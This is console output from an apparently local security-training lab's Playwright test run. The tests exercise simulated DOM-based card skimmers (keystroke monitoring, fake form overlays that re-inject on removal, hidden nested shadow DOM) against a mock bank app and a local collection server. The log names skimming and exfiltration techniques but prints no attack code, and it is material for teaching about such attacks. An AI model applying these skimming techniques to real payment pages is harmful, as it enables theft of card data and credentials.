ğŸ§ª Test Environment: local
ğŸ“ Home Index: http://localhost:3000
ğŸ“ Lab 1 Vulnerable: http://localhost:9001
ğŸ“ Lab 1 C2: http://localhost:9002
ğŸ§ª Test environment: local
ğŸ“ Lab 2 Vulnerable URL: http://localhost:9003
ğŸ“ Lab 2 C2 URL: http://localhost:9004
ğŸ§ª Test environment: local
ğŸ“ Lab 2 Vulnerable URL: http://localhost:9003
ğŸ“ Lab 2 C2 URL: http://localhost:9004
ğŸ§ª Test environment: local
ğŸ“ Lab 2 Vulnerable URL: http://localhost:9003
ğŸ“ Lab 2 C2 URL: http://localhost:9004
ğŸ§ª Test environment: local
ğŸ“ Lab 2 Vulnerable URL: http://localhost:9003
ğŸ§ª Test environment: local
ğŸ“ Lab 2 Vulnerable URL: http://localhost:9003
ğŸ“ Lab 2 C2 URL: http://localhost:9004

Running 30 tests using 4 workers

ğŸ§ª Test Environment: local
ğŸ“ Home Index: http://localhost:3000
ğŸ“ Lab 1 Vulnerable: http://localhost:9001
ğŸ“ Lab 1 C2: http://localhost:9002
ğŸ§ª Test environment: local
ğŸ“ Lab 2 Vulnerable URL: http://localhost:9003
ğŸ“ Lab 2 C2 URL: http://localhost:9004
ğŸ§ª Test Environment: local
ğŸ“ Home Index: http://localhost:3000
ğŸ“ Lab 1 Vulnerable: http://localhost:9001
ğŸ“ Lab 1 C2: http://localhost:9002
ğŸ§ª Test environment: local
ğŸ“ Lab 2 Vulnerable URL: http://localhost:9003
ğŸ“ Lab 2 C2 URL: http://localhost:9004
ğŸ§ª Test Environment: local
ğŸ“ Home Index: http://localhost:3000
ğŸ“ Lab 1 Vulnerable: http://localhost:9001
ğŸ“ Lab 1 C2: http://localhost:9002
ğŸ§ª Test environment: local
ğŸ“ Lab 2 Vulnerable URL: http://localhost:9003
ğŸ“ Lab 2 C2 URL: http://localhost:9004
ğŸ§ª Test Environment: local
ğŸ“ Home Index: http://localhost:3000
ğŸ“ Lab 1 Vulnerable: http://localhost:9001
ğŸ“ Lab 1 C2: http://localhost:9002
ğŸ§ª Test environment: local
ğŸ“ Lab 2 Vulnerable URL: http://localhost:9003
ğŸ“ Lab 2 C2 URL: http://localhost:9004
ğŸ”„ Testing dynamic form detection...
ğŸ§ª Testing credit card exfiltration...
âŒ¨ï¸ Testing real-time keystroke capture...
ğŸš€ Testing DOM mutation monitoring...
ğŸ¦ LOG: [Banking] Initializing SecureBank online banking system...
ğŸ¦ LOG: [Banking] Starting application initialization...
ğŸ¦ LOG: [Banking] Initializing security monitoring...
ğŸ¦ LOG: [Banking] Showing add card form
ğŸ¦ LOG: [Banking] Application initialized successfully
ğŸ•µï¸ DOM-MONITOR LOG: [DOM-Monitor] Initializing real-time field monitoring attack...
ğŸ•µï¸ DOM-MONITOR LOG: [DOM-Monitor] Initializing DOM monitor attack... 
ğŸ“ Filling out credit card form...
âœ… Submitting credit card form...
ğŸ¦ LOG: [Banking] Processing add card...
ğŸ¦ LOG: [Banking] Simulating add-card transaction: {cardNumber: 4532 1234 5678 9010, cardHolderName: John Doe, cardExpiry: 12/28, cvv: 123, billingZip: 12345}
ğŸ¦ LOG: [Banking] Showing success message: Welcome back, John Doe!
  âœ˜   2 [chromium] â€º test/tests/dom-monitor.spec.js:49:3 â€º DOM-Based Skimming Lab - Real-Time Field Monitor â€º should monitor DOM mutations and attach to new forms (4.3s)
  âœ˜   4 [chromium] â€º test/tests/dom-monitor.spec.js:174:3 â€º DOM-Based Skimming Lab - Real-Time Field Monitor â€º should detect and monitor dynamically added forms (4.5s)
  âœ˜   3 [chromium] â€º test/tests/dom-monitor.spec.js:109:3 â€º DOM-Based Skimming Lab - Real-Time Field Monitor â€º should capture keystrokes in real-time (5.1s)
ğŸ¦ LOG: [Banking] add-card transaction completed successfully
ğŸ¦ LOG: [Banking] Showing success message: Credit card added successfully
ğŸ§ª Test Environment: local
ğŸ“ Home Index: http://localhost:3000
ğŸ“ Lab 1 Vulnerable: http://localhost:9001
ğŸ“ Lab 1 C2: http://localhost:9002
ğŸ§ª Test environment: local
ğŸ“ Lab 2 Vulnerable URL: http://localhost:9003
ğŸ“ Lab 2 C2 URL: http://localhost:9004
ğŸ” Verifying data exfiltration to C2 server...
ğŸ“Š C2 Server Stats: {
  totalRequests: [33m0[39m,
  domMonitorSessions: [33m0[39m,
  formOverlayCaptues: [33m0[39m,
  shadowDomCaptures: [33m0[39m,
  uniqueVictims: [33m0[39m,
  startTime: [33m1762868679153[39m,
  uptime: [33m798483[39m,
  uptimeHours: [33m0.22[39m
}
ğŸ§ª Test Environment: local
ğŸ“ Home Index: http://localhost:3000
ğŸ“ Lab 1 Vulnerable: http://localhost:9001
ğŸ“ Lab 1 C2: http://localhost:9002
ğŸ§ª Test environment: local
ğŸ“ Lab 2 Vulnerable URL: http://localhost:9003
ğŸ“ Lab 2 C2 URL: http://localhost:9004
ğŸ§ª Test Environment: local
ğŸ“ Home Index: http://localhost:3000
ğŸ“ Lab 1 Vulnerable: http://localhost:9001
ğŸ“ Lab 1 C2: http://localhost:9002
ğŸ§ª Test environment: local
ğŸ“ Lab 2 Vulnerable URL: http://localhost:9003
ğŸ“ Lab 2 C2 URL: http://localhost:9004
  âœ˜   1 [chromium] â€º test/tests/cc-exfiltration.spec.js:39:3 â€º Lab 2: DOM-Based Skimming - Credit Card Exfiltration â€º should enter CC information and verify C2 server shows exfiltrated data (7.5s)
ğŸ’ Testing high-value field immediate exfiltration...
ğŸ” Analyzing DOM monitoring attack patterns...
ğŸ“¤ Testing page unload data exfiltration...
  âœ˜   6 [chromium] â€º test/tests/dom-monitor.spec.js:318:3 â€º DOM-Based Skimming Lab - Real-Time Field Monitor â€º should contain DOM monitoring attack patterns (2.4s)
ğŸ§ª Test Environment: local
ğŸ“ Home Index: http://localhost:3000
ğŸ“ Lab 1 Vulnerable: http://localhost:9001
ğŸ“ Lab 1 C2: http://localhost:9002
ğŸ§ª Test environment: local
ğŸ“ Lab 2 Vulnerable URL: http://localhost:9003
ğŸ“ Lab 2 C2 URL: http://localhost:9004
  âœ˜   5 [chromium] â€º test/tests/dom-monitor.spec.js:240:3 â€º DOM-Based Skimming Lab - Real-Time Field Monitor â€º should handle high-value field immediate exfiltration (2.6s)
  âœ˜   7 [chromium] â€º test/tests/dom-monitor.spec.js:368:3 â€º DOM-Based Skimming Lab - Real-Time Field Monitor â€º should handle page unload data exfiltration (2.1s)
ğŸ§ª Test Environment: local
ğŸ“ Home Index: http://localhost:3000
ğŸ“ Lab 1 Vulnerable: http://localhost:9001
ğŸ“ Lab 1 C2: http://localhost:9002
ğŸ§ª Test environment: local
ğŸ“ Lab 2 Vulnerable URL: http://localhost:9003
ğŸ“ Lab 2 C2 URL: http://localhost:9004
ğŸ§ª Test Environment: local
ğŸ“ Home Index: http://localhost:3000
ğŸ“ Lab 1 Vulnerable: http://localhost:9001
ğŸ“ Lab 1 C2: http://localhost:9002
ğŸ§ª Test environment: local
ğŸ“ Lab 2 Vulnerable URL: http://localhost:9003
ğŸ“ Lab 2 C2 URL: http://localhost:9004
ğŸš€ Testing form overlay injection...
ğŸ§ª Test Environment: local
ğŸ“ Home Index: http://localhost:3000
ğŸ“ Lab 1 Vulnerable: http://localhost:9001
ğŸ“ Lab 1 C2: http://localhost:9002
ğŸ§ª Test environment: local
ğŸ“ Lab 2 Vulnerable URL: http://localhost:9003
ğŸ“ Lab 2 C2 URL: http://localhost:9004
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Initializing form overlay injection attack...
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Initializing form overlay attack... 
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Scanning for target forms... 
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Found 1 target forms 
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Found 1 target forms, preparing overlay injection... 
â³ Waiting for overlay injection delay...
ğŸ£ Testing credential capture through overlay...
ğŸ¨ Testing form-specific overlay customization...
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Injecting form overlay... 
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Creating overlay for form type: payment 
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Form overlay injected successfully 
ğŸ”„ Testing overlay persistence mechanisms...
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Initializing form overlay injection attack...
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Initializing form overlay attack... 
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Initializing form overlay injection attack...
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Initializing form overlay attack... 
ğŸ§ª Testing transfer form overlay...
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Initializing form overlay injection attack...
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Initializing form overlay attack... 
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Scanning for target forms... 
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Found 1 target forms 
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Found 1 target forms, preparing overlay injection... 
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Scanning for target forms... 
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Found 2 target forms 
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Found 2 target forms, preparing overlay injection... 
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Scanning for target forms... 
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Found 2 target forms 
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Found 2 target forms, preparing overlay injection... 
ğŸ­ Overlay injection status: [33mtrue[39m
âœ… Form overlay successfully injected
ğŸ‘» Original form hidden status: [33mfalse[39m
  âœ˜   8 [chromium] â€º test/tests/form-overlay.spec.js:49:3 â€º DOM-Based Skimming Lab - Form Overlay Injection â€º should inject overlay on high-priority forms (7.1s)
âš ï¸ No overlay appeared for transfer section
ğŸ§ª Testing payments form overlay...
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Injecting form overlay... 
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Creating overlay for form type: payment 
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Form overlay injected successfully 
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Injecting form overlay... 
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Creating overlay for form type: financial 
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Form overlay injected successfully 
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Injecting form overlay... 
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Creating overlay for form type: financial 
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Form overlay injected successfully 
ğŸ­ Overlay detected, filling fake form...
ğŸ” Password entered in overlay
ğŸ§ª Test Environment: local
ğŸ“ Home Index: http://localhost:3000
ğŸ“ Lab 1 Vulnerable: http://localhost:9001
ğŸ“ Lab 1 C2: http://localhost:9002
ğŸ§ª Test environment: local
ğŸ“ Lab 2 Vulnerable URL: http://localhost:9003
ğŸ“ Lab 2 C2 URL: http://localhost:9004
ğŸ­ Initial overlay detected
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Overlay removal detected, re-injecting... 
ğŸ—‘ï¸ Overlay manually removed
  âœ˜   9 [chromium] â€º test/tests/form-overlay.spec.js:98:3 â€º DOM-Based Skimming Lab - Form Overlay Injection â€º should capture credentials through fake overlay (6.6s)
ğŸ“ Overlay title for payments: âš ï¸ Transaction Verification
ğŸ” Analyzing form overlay attack patterns...
  âœ˜  10 [chromium] â€º test/tests/form-overlay.spec.js:201:3 â€º DOM-Based Skimming Lab - Form Overlay Injection â€º should show appropriate overlay for different form types (7.3s)
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Initializing form overlay injection attack...
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Initializing form overlay attack... 
ğŸ§ª Test Environment: local
ğŸ“ Home Index: http://localhost:3000
ğŸ“ Lab 1 Vulnerable: http://localhost:9001
ğŸ“ Lab 1 C2: http://localhost:9002
ğŸ§ª Test environment: local
ğŸ“ Lab 2 Vulnerable URL: http://localhost:9003
ğŸ“ Lab 2 C2 URL: http://localhost:9004
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Scanning for target forms... 
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Found 1 target forms 
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Found 1 target forms, preparing overlay injection... 
  âœ˜  11 [chromium] â€º test/tests/form-overlay.spec.js:247:3 â€º DOM-Based Skimming Lab - Form Overlay Injection â€º should handle overlay persistence and anti-removal (8.1s)
ğŸ§ª Test Environment: local
ğŸ“ Home Index: http://localhost:3000
ğŸ“ Lab 1 Vulnerable: http://localhost:9001
ğŸ“ Lab 1 C2: http://localhost:9002
ğŸ§ª Test environment: local
ğŸ“ Lab 2 Vulnerable URL: http://localhost:9003
ğŸ“ Lab 2 C2 URL: http://localhost:9004
ğŸ“Š Attack pattern analysis: {
  formOverlayAttack: [33mtrue[39m,
  hasMutationObserver: [33mtrue[39m,
  hasOverlayStyles: [33mfalse[39m,
  hasFormQueries: [33mtrue[39m,
  hasDynamicContent: [33mtrue[39m
}
âŒ Testing overlay cancellation and closure...
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Injecting form overlay... 
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Creating overlay for form type: payment 
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Form overlay injected successfully 
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Initializing form overlay injection attack...
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Initializing form overlay attack... 
ğŸ§ª Test Environment: local
ğŸ“ Home Index: http://localhost:3000
ğŸ“ Lab 1 Vulnerable: http://localhost:9001
ğŸ“ Lab 1 C2: http://localhost:9002
ğŸ§ª Test environment: local
ğŸ“ Lab 2 Vulnerable URL: http://localhost:9003
ğŸª Testing social engineering elements in overlay...
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Scanning for target forms... 
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Found 1 target forms 
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Found 1 target forms, preparing overlay injection... 
ğŸ­ Overlay-specific patterns: {
  hasOverlayBackdrop: [33mtrue[39m,
  hasOverlayStyles: [33mtrue[39m,
  hasFormHiddenClass: [33mtrue[39m,
  hasHighZIndex: [33mtrue[39m
}
âœ… Form overlay attack patterns verified
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Initializing form overlay injection attack...
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Initializing form overlay attack... 
  âœ“  12 [chromium] â€º test/tests/form-overlay.spec.js:306:3 â€º DOM-Based Skimming Lab - Form Overlay Injection â€º should contain form overlay attack patterns (6.7s)
ğŸ§ª Test environment: local
ğŸ“ Lab 2 Vulnerable URL: http://localhost:9003
ğŸ§ª Testing navigation buttons functionality...
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Scanning for target forms... 
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Found 2 target forms 
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Found 2 target forms, preparing overlay injection... 
ğŸ§ª Testing navigation buttons layout...
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Injecting form overlay... 
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Creating overlay for form type: payment 
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Form overlay injected successfully 
ğŸ¦ BANKING LOG: [Banking] Initializing SecureBank online banking system...
ğŸ¦ BANKING LOG: [Banking] Starting application initialization...
ğŸ­ Overlay detected, testing closure mechanisms...
ğŸ¦ BANKING LOG: [Banking] Initializing security monitoring...
ğŸ¦ BANKING LOG: [Banking] Showing add card form
ğŸ¦ BANKING LOG: [Banking] Application initialized successfully
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Closing form overlay... 
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Form overlay closed 
ğŸ¦ BANKING LOG: [Banking] Initializing SecureBank online banking system...
ğŸ¦ BANKING LOG: [Banking] Starting application initialization...
ğŸ¦ BANKING LOG: [Banking] Initializing security monitoring...
ğŸ¦ BANKING LOG: [Banking] Showing add card form
ğŸ¦ BANKING LOG: [Banking] Application initialized successfully
âœ… Back button found with href: http://localhost:3000
âœ… View Stolen Data button found with href: http://localhost:9004
âœ… Both navigation buttons are enabled and clickable
  âœ“  16 [chromium] â€º test/tests/lab2-improvements.spec.js:50:3 â€º Lab 2: DOM-Based Skimming - UI Improvements â€º should have Back and View Stolen Data buttons that work (2.1s)
âœ… Navigation buttons are correctly positioned above lab tabs
  âœ“  15 [chromium] â€º test/tests/lab2-improvements.spec.js:25:3 â€º Lab 2: DOM-Based Skimming - UI Improvements â€º should display navigation buttons above lab page tabs (2.4s)
ğŸ”´ Close button functionality: [33mtrue[39m
âœ… Close button working correctly
ğŸ”„ Original form restored: [33mtrue[39m
ğŸ§ª Testing default page is cards...
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Injecting form overlay... 
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Creating overlay for form type: financial 
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Form overlay injected successfully 
ğŸ§ª Testing add new card form is visible by default...
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Initializing form overlay injection attack...
ğŸ­ FORM-OVERLAY LOG: [Form-Overlay] Initializing form overlay attack... 
ğŸ¦ BANKING LOG: [Banking] Initializing SecureBank online banking system...
ğŸ¦ BANKING LOG: [Banking] Starting application initialization...
ğŸ¦ BANKING LOG: [Banking] Initializing security monitoring...
ğŸ¦ BANKING LOG: [Banking] Showing add card form
ğŸ¦ BANKING LOG: [Banking] Application initialized successfully
ğŸ¦ BANKING LOG: [Banking] Initializing SecureBank online banking system...
ğŸ¦ BANKING LOG: [Banking] Starting application initialization...
ğŸ¦ BANKING LOG: [Banking] Initializing security monitoring...
ğŸ¦ BANKING LOG: [Banking] Showing add card form
ğŸ¦ BANKING LOG: [Banking] Application initialized successfully
âœ… Cards page is default on load
  âœ“  17 [chromium] â€º test/tests/lab2-improvements.spec.js:82:3 â€º Lab 2: DOM-Based Skimming - UI Improvements â€º should default to cards page on load (1.5s)
ğŸ­ Analyzing social engineering elements...
ğŸ” Security notice present: [33mtrue[39m
ğŸ”’ Security message: 
                            ğŸ”’
                            This is a secure transaction. Your information is encrypted.
                        
ğŸ¦ Bank logo present: [33mtrue[39m
ğŸ›ï¸ Logo text: ğŸ¦ SecureBank
âš ï¸ Title message: âš ï¸ Transaction Verification
ğŸš¨ Urgency markers found: [33mtrue[39m
ğŸ”’ Footer security text: 
                        ğŸ” SSL Secured | SecureBank Â© 2024
                    
ğŸª Social engineering analysis completed
  âœ“  14 [chromium] â€º test/tests/form-overlay.spec.js:444:3 â€º DOM-Based Skimming Lab - Form Overlay Injection â€º should demonstrate social engineering elements (5.9s)
ğŸ§ª Test environment: local
ğŸ“ Lab 2 Vulnerable URL: http://localhost:9003
ğŸ§ª Testing add new card form is ready for user input...
ğŸ¦ BANKING LOG: [Banking] Showing success message: Welcome back, John Doe!
ğŸ§ª Testing Settings tab is removed...
ğŸ¦ BANKING LOG: [Banking] Initializing SecureBank online banking system...
ğŸ¦ BANKING LOG: [Banking] Starting application initialization...
ğŸ¦ BANKING LOG: [Banking] Initializing security monitoring...
ğŸ¦ BANKING LOG: [Banking] Showing add card form
ğŸ¦ BANKING LOG: [Banking] Application initialized successfully
ğŸ¦ BANKING LOG: [Banking] Initializing SecureBank online banking system...
ğŸ¦ BANKING LOG: [Banking] Starting application initialization...
ğŸ¦ BANKING LOG: [Banking] Initializing security monitoring...
ğŸ¦ BANKING LOG: [Banking] Showing add card form
ğŸ¦ BANKING LOG: [Banking] Application initialized successfully
  âœ˜  13 [chromium] â€º test/tests/form-overlay.spec.js:371:3 â€º DOM-Based Skimming Lab - Form Overlay Injection â€º should handle overlay cancellation and closure (8.1s)
âœ… Settings tab has been removed
  âœ“  20 [chromium] â€º test/tests/lab2-improvements.spec.js:180:3 â€º Lab 2: DOM-Based Skimming - UI Improvements â€º should not have Settings tab (1.4s)
ğŸ¦ BANKING LOG: [Banking] Showing success message: Welcome back, John Doe!
ğŸ§ª Testing tab navigation...
ğŸ¦ BANKING LOG: [Banking] Initializing SecureBank online banking system...
ğŸ¦ BANKING LOG: [Banking] Starting application initialization...
ğŸ¦ BANKING LOG: [Banking] Initializing security monitoring...
ğŸ¦ BANKING LOG: [Banking] Showing add card form
ğŸ¦ BANKING LOG: [Banking] Application initialized successfully
ğŸ§ª Test Environment: local
ğŸ“ Home Index: http://localhost:3000
ğŸ“ Lab 1 Vulnerable: http://localhost:9001
ğŸ“ Lab 1 C2: http://localhost:9002
ğŸ§ª Test environment: local
ğŸ“ Lab 2 Vulnerable URL: http://localhost:9003
ğŸ¦ BANKING LOG: [Banking] Navigated to section: dashboard
ğŸ¦ BANKING LOG: [Banking] Showing success message: Welcome back, John Doe!
ğŸ¦ BANKING LOG: [Banking] Navigated to section: cards
ğŸ¦ BANKING LOG: [Banking] Showing add card form
âœ… Tab navigation works correctly
  âœ“  21 [chromium] â€º test/tests/lab2-improvements.spec.js:243:3 â€º Lab 2: DOM-Based Skimming - UI Improvements â€º should navigate between tabs correctly (2.4s)
ğŸ§ª Test environment: local
ğŸ“ Lab 2 Vulnerable URL: http://localhost:9003
ğŸ“ Lab 2 C2 URL: http://localhost:9004
ğŸš€ Testing Shadow DOM infrastructure creation...
ğŸ§ª Testing simplified interface focused on cards...
ğŸ¦ BANKING LOG: [Banking] Initializing SecureBank online banking system...
ğŸ¦ BANKING LOG: [Banking] Starting application initialization...
ğŸ¦ BANKING LOG: [Banking] Initializing security monitoring...
ğŸ¦ BANKING LOG: [Banking] Showing add card form
ğŸ¦ BANKING LOG: [Banking] Application initialized successfully
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing Shadow DOM stealth attack...
  âœ˜  18 [chromium] â€º test/tests/lab2-improvements.spec.js:105:3 â€º Lab 2: DOM-Based Skimming - UI Improvements â€º should show add new card form by default on cards page (6.9s)
ğŸ¦ BANKING LOG: [Banking] Showing success message: Welcome back, John Doe!
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing Shadow DOM skimmer attack... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating nested Shadow DOM structure for enhanced stealth... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869510181_f9omf26zv 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869510181_x9ilfps4p 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869510181_kj16h90cx 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869510182_kx40fdc49 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869510182_pjx7m4tta 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Created 5 nested Shadow DOM levels 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Setting up cross-shadow boundary monitoring... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Cross-boundary monitoring established 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Starting periodic shadow data exfiltration... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing shadow stealth measures... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM skimmer attack initialized successfully 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-number_cardNumber_text_1762869510283_1yyr6 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-holder-name_cardHolderName_text_1762869510283_fksgh 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-expiry_cardExpiry_text_1762869510284_5c8h1 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-cvv-input_cvv_text_1762869510284_trdqz 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-cvv_cvv_text_1762869510284_2evod 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_payment-account_accountNumber_text_1762869510284_syg86 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_transfer-form_no-name_no-type_1762869510284_x0dhx 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_payment-form_no-name_no-type_1762869510285_l7501 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_add-card-form_no-name_no-type_1762869510285_e3k4x 
ğŸ§ª Test Environment: local
ğŸ“ Home Index: http://localhost:3000
ğŸ“ Lab 1 Vulnerable: http://localhost:9001
ğŸ“ Lab 1 C2: http://localhost:9002
ğŸ§ª Test environment: local
ğŸ“ Lab 2 Vulnerable URL: http://localhost:9003
ğŸ“ Lab 2 C2 URL: http://localhost:9004
  âœ˜  19 [chromium] â€º test/tests/lab2-improvements.spec.js:150:3 â€º Lab 2: DOM-Based Skimming - UI Improvements â€º should have add new card form waiting for user input (6.6s)
ğŸ§ª Test Environment: local
ğŸ“ Home Index: http://localhost:3000
ğŸ“ Lab 1 Vulnerable: http://localhost:9001
ğŸ“ Lab 1 C2: http://localhost:9002
ğŸ§ª Test environment: local
ğŸ“ Lab 2 Vulnerable URL: http://localhost:9003
ğŸ“ Lab 2 C2 URL: http://localhost:9004
ğŸ” Analyzing shadow DOM infrastructure...
ğŸ“Š Shadow attack status: {
  active: [33mtrue[39m,
  shadowHosts: [33m5[39m,
  capturedSessions: [33m9[39m,
  monitoringIntervals: [33m3[39m
}
âœ… Shadow DOM infrastructure created successfully
ğŸ‘» Visible shadow hosts (should be 0): [33m0[39m
ğŸ‘» Shadow DOM infrastructure test completed
  âœ“  23 [chromium] â€º test/tests/shadow-skimmer.spec.js:49:3 â€º DOM-Based Skimming Lab - Shadow DOM Stealth Attack â€º should create hidden shadow DOM infrastructure (4.2s)
ğŸ”„ Testing cross-shadow boundary monitoring...
ğŸ’½ Testing shadow-isolated data capture...
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing Shadow DOM stealth attack...
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing Shadow DOM stealth attack...
ğŸ”’ Testing closed shadow DOM stealth capabilities...
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing Shadow DOM skimmer attack... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating nested Shadow DOM structure for enhanced stealth... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869514117_96qr7vktm 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869514117_02hpm41t8 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869514117_bfastkmqm 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
